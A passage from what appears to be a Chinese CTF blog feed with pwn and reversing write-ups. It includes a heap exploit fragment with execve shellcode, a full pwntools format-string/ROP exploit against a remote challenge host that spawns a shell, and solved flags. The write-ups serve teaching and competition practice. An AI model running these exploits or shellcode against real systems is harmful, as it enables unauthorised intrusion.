class="line">edit(unlink_id-1,"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05")</span><br><span class="line">#-----fill __malloc_hook</span><br><span class="line">payload = p64(0x500)+"\x38"</span><br><span class="line">edit(unlink_id,payload)</span><br><span class="line">delete(1)</span><br><span class="line">edit(0,p64(fastbin+0x10))</span><br><span class="line">add(0x80,1)</span><br><span class="line">edit(3,p64(0)*4+p64(0x500)+"\x10")</span><br><span class="line">edit(2,p64(Mmap))</span><br><span class="line">input()</span><br><span class="line">add(0x80,0)</span><br><span class="line">log.success("chunk3 :" + hex(chunk3))</span><br><span class="line">log.success("base :" + hex(base))</span><br><span class="line">log.success("unsort_bin_1 :"+hex(unsort_bin_1))</span><br><span class="line">log.success("Mmap :"+hex(Mmap))</span><br><span class="line">#log.success("__malloc_hook :"+hex(__malloc_hook))</span><br><span class="line">#gdb.attach(sh.pid)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-unsorted_bin-__free_hook-利用</title>
      <link href="/2019/06/16/CTF-unsorted_bin-__free_hook-%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/16/CTF-unsorted_bin-__free_hook-%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="3cc651274d3b2ce4c42a6e722e8194013f3b4ab3e7b74a4fb8801abcc52dee46"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-格式化字符串漏洞</title>
      <link href="/2019/06/11/CTF-Pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/06/11/CTF-Pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Printf利用"><a href="#Printf利用" class="headerlink" title="Printf利用"></a>Printf利用</h1><hr><h2 id="Printf基本操作"><a href="#Printf基本操作" class="headerlink" title="Printf基本操作"></a>Printf基本操作</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">32位</span><br><span class="line">读</span><br><span class="line">'%{}$x'.format(index)           // 读4个字节</span><br><span class="line">'%{}$p'.format(index)           // 同上面</span><br><span class="line">'${}$s'.format(index)</span><br><span class="line">写</span><br><span class="line">'%{}$n'.format(index)           // 解引用，写入四个字节</span><br><span class="line">'%{}$hn'.format(index)          // 解引用，写入两个字节</span><br><span class="line">'%{}$hhn'.format(index)         // 解引用，写入一个字节</span><br><span class="line">'%{}$lln'.format(index)         // 解引用，写入八个字节</span><br><span class="line">64位</span><br><span class="line">读</span><br><span class="line">'%{}$x'.format(index, num)      // 读4个字节</span><br><span class="line">'%{}$lx'.format(index, num)     // 读8个字节</span><br><span class="line">'%{}$p'.format(index)           // 读8个字节</span><br><span class="line">'${}$s'.format(index)</span><br><span class="line">写</span><br><span class="line">'%{}$n'.format(index)           // 解引用，写入四个字节</span><br><span class="line">'%{}$hn'.format(index)          // 解引用，写入两个字节</span><br><span class="line">'%{}$hhn'.format(index)         // 解引用，写入一个字节</span><br><span class="line">'%{}$lln'.format(index)         // 解引用，写入八个字节</span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></tbody></table></figure></div><h2 id="Pwntools集成printf"><a href="#Pwntools集成printf" class="headerlink" title="Pwntools集成printf"></a>Pwntools集成printf</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(offset,{address:value},write_size="short")</span><br></pre></td></tr></tbody></table></figure></div><h2 id="Printf的高级利用"><a href="#Printf的高级利用" class="headerlink" title="Printf的高级利用"></a>Printf的高级利用</h2><hr><h3 id="前言：我们遇到的简单格式化字符串漏洞的buf都是在栈里的，但是如果他它存在于bss里，该怎么办，具体题目如下"><a href="#前言：我们遇到的简单格式化字符串漏洞的buf都是在栈里的，但是如果他它存在于bss里，该怎么办，具体题目如下" class="headerlink" title="前言：我们遇到的简单格式化字符串漏洞的buf都是在栈里的，但是如果他它存在于bss里，该怎么办，具体题目如下"></a>前言：我们遇到的简单格式化字符串漏洞的buf都是在栈里的，但是如果他它存在于bss里，该怎么办，具体题目如下</h3><h3 id="文件下载-format-rar"><a href="#文件下载-format-rar" class="headerlink" title="文件下载 format.rar"></a>文件下载 <a href="format.rar">format.rar</a></h3><h3 id="题目来自-2019-6-16看雪论坛CTF"><a href="#题目来自-2019-6-16看雪论坛CTF" class="headerlink" title="题目来自 2019.6.16看雪论坛CTF"></a>题目来自 2019.6.16看雪论坛CTF</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char buf; // [esp+0h] [ebp-10h]</span><br><span class="line">  unsigned int v6; // [esp+4h] [ebp-Ch]</span><br><span class="line">  int *v7; // [esp+8h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &argc;</span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  puts("Welcome to kanxue 2019, your pwn like cxk");</span><br><span class="line">  do</span><br><span class="line">  {</span><br><span class="line">    while ( 1 )</span><br><span class="line">    {</span><br><span class="line">      menu();</span><br><span class="line">      read(0, &buf, 4u);</span><br><span class="line">      v3 = atoi(&buf);</span><br><span class="line">      if ( v3 != 1 )</span><br><span class="line">        break;</span><br><span class="line">      printf("What do tou want to say:");</span><br><span class="line">      read_input((int)&echo, 24);</span><br><span class="line">      printf((const char *)&echo);//echo在bss段，而不是在buf中</span><br><span class="line">      puts((const char *)&unk_A97);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  while ( v3 != 2 );</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="思路：利用栈中上一个函数压入的ebp作为跳板，修改低位使其指向当前函数的ret，然后构造ROP链，所以两次printf就可以写入ret处两个字节数据"><a href="#思路：利用栈中上一个函数压入的ebp作为跳板，修改低位使其指向当前函数的ret，然后构造ROP链，所以两次printf就可以写入ret处两个字节数据" class="headerlink" title="思路：利用栈中上一个函数压入的ebp作为跳板，修改低位使其指向当前函数的ret，然后构造ROP链，所以两次printf就可以写入ret处两个字节数据"></a>思路：利用栈中上一个函数压入的ebp作为跳板，修改低位使其指向当前函数的ret，然后构造ROP链，所以两次printf就可以写入ret处两个字节数据</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./format")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">sh = remote("152.136.18.34",9999)</span><br><span class="line">elf = ELF("format")</span><br><span class="line">base_addr = 0</span><br><span class="line">ret_addr = 0</span><br><span class="line">ret2addr = 0</span><br><span class="line">def getBaseAddress():</span><br><span class="line">    global base_addr</span><br><span class="line">    sh.recvuntil("Choice:")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("What do tou want to say:")</span><br><span class="line">    sh.sendline("%3$p")</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    base_addr = int(sh.recv(8),16)</span><br><span class="line">    base_addr = (base_addr>>12) << 12</span><br><span class="line">    log.success("base_addr :"+hex(base_addr))</span><br><span class="line">def getRetAddress():</span><br><span class="line">    global ret_addr</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("What do tou want to say:")</span><br><span class="line">    sh.sendline("%5$p")</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    ret_addr = int(sh.recv(8),16)</span><br><span class="line">    ret_addr = (ret_addr - 0xD4) + 60</span><br><span class="line">    log.success("ret_addr :"+hex(ret_addr))</span><br><span class="line">def getRet2Address():</span><br><span class="line">    global ret2addr</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("What do tou want to say:")</span><br><span class="line">    sh.sendline("%15$p")</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    ret2addr = int(sh.recv(8),16)</span><br><span class="line">    log.success("ret2addr  :" + hex(ret2addr))</span><br><span class="line">def inputMsg(msg):</span><br><span class="line">    sh.recvuntil("Choice:")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("say:")</span><br><span class="line">    sh.sendline(msg)</span><br><span class="line">def writeByte(byte,offset):</span><br><span class="line">    _offset = (ret_addr + offset) % 0x10000</span><br><span class="line">    if(byte == 0):</span><br><span class="line">       inputMsg("%." + str(_offset) + "d%5$hn") </span><br><span class="line">       inputMsg("%53$hn")</span><br><span class="line">    else:</span><br><span class="line">       inputMsg("%." + str(_offset) + "d%5$hn")</span><br><span class="line">       inputMsg("%." + str(byte) + "d%53$hn")</span><br><span class="line">def write2Bytes(bytes,offset):</span><br><span class="line">    _offset = offset</span><br><span class="line">    writeByte(bytes % 0x10000,_offset)</span><br><span class="line">    writeByte(bytes >> 16,_offset+2)</span><br><span class="line">    return _offset + 4</span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    # 0xff889254 - 0xff889180 = 0xD4</span><br><span class="line">    # 0xffc25204 - 0xffc25130 = 0xD4</span><br><span class="line">    global base_addr</span><br><span class="line">    global ret2addr</span><br><span class="line">    global ret_addr</span><br><span class="line">    pop_ret = 0x00000585</span><br><span class="line">    getBaseAddress()</span><br><span class="line">    getRetAddress()</span><br><span class="line">    getRet2Address()</span><br><span class="line">    offset = 0;</span><br><span class="line">    pop_ebx_ret = 0x00000585</span><br><span class="line">    pop_ebp_ret = 0x000009eb</span><br><span class="line">    pop3_ret = 0x000009e9</span><br><span class="line">    offset = write2Bytes(pop_ebx_ret + base_addr,offset)</span><br><span class="line">    offset = write2Bytes(base_addr + 0x1FB0 , offset)</span><br><span class="line">    offset = write2Bytes(base_addr+elf.plt['puts'],offset)</span><br><span class="line">    offset = write2Bytes(pop_ebp_ret + base_addr,offset)</span><br><span class="line">    offset = write2Bytes(base_addr+elf.got['__libc_start_main'],offset)</span><br><span class="line">    offset = write2Bytes(base_addr+elf.plt['read'],offset)</span><br><span class="line">    offset = write2Bytes(pop3_ret+base_addr,offset)</span><br><span class="line">    offset = write2Bytes(0,offset)</span><br><span class="line">    offset = write2Bytes(ret_addr+offset - 8,offset)</span><br><span class="line">    offset = write2Bytes(100,offset)</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("Choice:")</span><br><span class="line">    libc = u32(sh.recv(4))</span><br><span class="line">    log.success("libc :" + hex(libc))</span><br><span class="line">#    system_addr = libc + 0x24470</span><br><span class="line">#    binsh_addr = libc + 0x16533f</span><br><span class="line">    system_addr = libc - lib.symbols['__libc_start_main'] + lib.symbols['system']</span><br><span class="line">    binsh_addr = libc - lib.symbols['__libc_start_main'] + next(lib.search("/bin/sh"))</span><br><span class="line">    payload = p32(system_addr) + p32(0) + p32(binsh_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h3><p><a href="/2019/06/11/CTF-Pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/11/CTF-Pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png" class="lazyload"></a></p><h2 id="flag-c6671fc0-cea3-42ef-8af0-c20c65f854be"><a href="#flag-c6671fc0-cea3-42ef-8af0-c20c65f854be" class="headerlink" title="flag{c6671fc0-cea3-42ef-8af0-c20c65f854be}"></a>flag{c6671fc0-cea3-42ef-8af0-c20c65f854be}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年6月BNSCTF</title>
      <link href="/2019/06/09/CTF-2019%E5%B9%B46%E6%9C%88BNSCTF/"/>
      <url>/2019/06/09/CTF-2019%E5%B9%B46%E6%9C%88BNSCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="看到学长打，我也去试试水，确实是冷门的CTF，第一届比较水"><a href="#看到学长打，我也去试试水，确实是冷门的CTF，第一届比较水" class="headerlink" title="看到学长打，我也去试试水，确实是冷门的CTF，第一届比较水"></a>看到学长打，我也去试试水，确实是冷门的CTF，第一届比较水</h3><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="0x01-简单算法algorithm-rar"><a href="#0x01-简单算法algorithm-rar" class="headerlink" title="0x01 简单算法algorithm.rar"></a>0x01 简单算法<a href="algorithm.rar">algorithm.rar</a></h3><p>醉了，题目存在多个flag，然后要找有英文意义的<br>将程序导入IDA，发现加密算法只是单字符变换，所以直接把IDA代码扒下来改造</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<string.h></string.h></span><br><span class="line">using namespace std;</span><br><span class="line">char v12[] = "AAFMZXDECVFRBNGTHYJUMKIOLPABY";</span><br><span class="line">char v19[] = "0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";</span><br><span class="line">char v28[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";</span><br><span class="line">char v37[] = "+/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";</span><br><span class="line">char v46[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";</span><br><span class="line">char v3[] = "";</span><br><span class="line">char v6[] = "/cIg5ckkwhX51HYpxAjkU5EgMxnMUt";</span><br><span class="line">void test(char* Str) {</span><br><span class="line">for (int i = 0;i<30; ++i)</span><br><span class="line">{</span><br><span class="line">int v4 = i;</span><br><span class="line">if (v4 >= strlen(Str))</span><br><span class="line">break;</span><br><span class="line">int v3 = (unsigned int)((Str[i] - *(v12 + i)) >> 31) >> 30;</span><br><span class="line">int v55 = (((char)v3 + Str[i] - *(v12 + i)) & 3) - v3;</span><br><span class="line">if (Str[i] != '' && Str[i] > ' ' && Str[i] - *(v12 + i) > 0)</span><br><span class="line">{</span><br><span class="line">v3 = (unsigned int)((Str[i] - *(v12 + i)) >> 31) >> 30;</span><br><span class="line">v55 = (((char)v3 + Str[i] - *(v12 + i)) & 3) - v3;</span><br><span class="line">if (v55 == 1)</span><br><span class="line">{</span><br><span class="line">Str[i] = *(v37 + Str[i] - (signed int)*(v12 + i));</span><br><span class="line">}</span><br><span class="line">else if (v55 > 1)</span><br><span class="line">{</span><br><span class="line">if (v55 == 2)</span><br><span class="line">{</span><br><span class="line">Str[i] = *(v28 + Str[i] - (signed int)*(v12 + i));</span><br><span class="line">}</span><br><span class="line">else if (v55 == 3)</span><br><span class="line">{</span><br><span class="line">Str[i] = *(v19 + Str[i] - (signed int)*(v12 + i));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else if (!v55)</span><br><span class="line">{</span><br><span class="line">Str[i] = *(v46 + Str[i] - (signed int)*(v12 + i));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">void test2(char* Str) {</span><br><span class="line">for (int i = 0; i <= 29; ++i)</span><br><span class="line">{</span><br><span class="line">if (Str[i] != *(v6 + i))</span><br><span class="line">{</span><br><span class="line">printf("try again!");</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">int main() {</span><br><span class="line">string s;</span><br><span class="line">char flag[32] = { 33 };</span><br><span class="line">char _f[32] = { 33 };</span><br><span class="line">for (int i = 0; i < 30; i++) {</span><br><span class="line">for (int j = 0; j < 128; j++) {</span><br><span class="line">_f[i] = j;</span><br><span class="line">test(_f);</span><br><span class="line">if (_f[i] == v6[i]) {</span><br><span class="line">printf("position:%d  %c\n", i, j);</span><br><span class="line">flag[i] = j;</span><br><span class="line">continue;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>输出结果</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">position:0  /position:0  Bposition:0  L</span><br><span class="line">position:1  Cposition:1  ]</span><br><span class="line">position:2  Nposition:2  h</span><br><span class="line">position:3  Sposition:3  m</span><br><span class="line">position:4  5position:4  {</span><br><span class="line">position:5  Zposition:5  t</span><br><span class="line">position:6  Nposition:6  h</span><br><span class="line">position:7  Oposition:7  i</span><br><span class="line">position:8  Yposition:8  s</span><br><span class="line">position:9  _</span><br><span class="line">position:10  i</span><br><span class="line">position:11  5position:11  s</span><br><span class="line">position:12  1position:12  _</span><br><span class="line">position:13  Hposition:13  aposition:13  {</span><br><span class="line">position:14  _position:14  y</span><br><span class="line">position:15  e</span><br><span class="line">position:16  a</span><br><span class="line">position:17  Aposition:17  s</span><br><span class="line">position:18  y</span><br><span class="line">position:19  _position:19  y</span><br><span class="line">position:20  aposition:20  {</span><br><span class="line">position:21  5position:21  l</span><br><span class="line">position:22  Eposition:22  Mposition:22  g</span><br><span class="line">position:23  Uposition:23  o</span><br><span class="line">position:24  Xposition:24  r</span><br><span class="line">position:25  i</span><br><span class="line">position:26  t</span><br><span class="line">position:27  Nposition:27  h</span><br><span class="line">position:28  Uposition:28  m</span><br><span class="line">position:29  [position:29  u</span><br></pre></td></tr></tbody></table></figure></div><p>以上输出结果表示，对应的位数的多种解<br>然后人工去找有意义的英文</p><h2 id="BCNS-this-is-a-easy-algorithm"><a href="#BCNS-this-is-a-easy-algorithm" class="headerlink" title="BCNS{this_is_a_easy_algorithm}"></a>BCNS{this_is_a_easy_algorithm}</h2><h3 id="0x02-EASY-XORmain-rar"><a href="#0x02-EASY-XORmain-rar" class="headerlink" title="0x02 EASY_XORmain.rar"></a>0x02 EASY_XOR<a href="main.rar">main.rar</a></h3><p>这是一个py2exe文件，所以要通过pyinstxtractor.py导出数据<br>然后在main.exe_extracted目录下找到PYZ-00.pyz_extracted<br>然后在里面找源代码，最后找到easy.pyc<br>由于这样导出的文件的头部会出问题，所以考虑本地先生成一个pyc文件，然后把头部数据覆盖到easy.pyc上<br>我这里是 0x33 0x0D 0x0D 0x0A 只需要覆盖即可，无需添加字节<br>【注意到main.exe_extracted目录下有一个main，里面可以看到和easy.pyc类似的代码，但不知道为什么无法转化到py】<br>通过在线pyc转py得到python代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    a = 'flag!iS_not&here,getit'</span><br><span class="line">    b = [36,47,47,52,90,32,12,107,3,48,21,121,26,86,19,41,115,33,9,53,14,9]</span><br><span class="line">    flag = input('please input the flag:')</span><br><span class="line">    for i in range(len(a)):</span><br><span class="line">        if ord(a[i]) ^ ord(flag[i]) == b[i]:</span><br><span class="line">            continue</span><br><span class="line">            continue</span><br><span class="line">        print('No!')</span><br><span class="line">        exit()</span><br><span class="line">    print('you get it!')</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 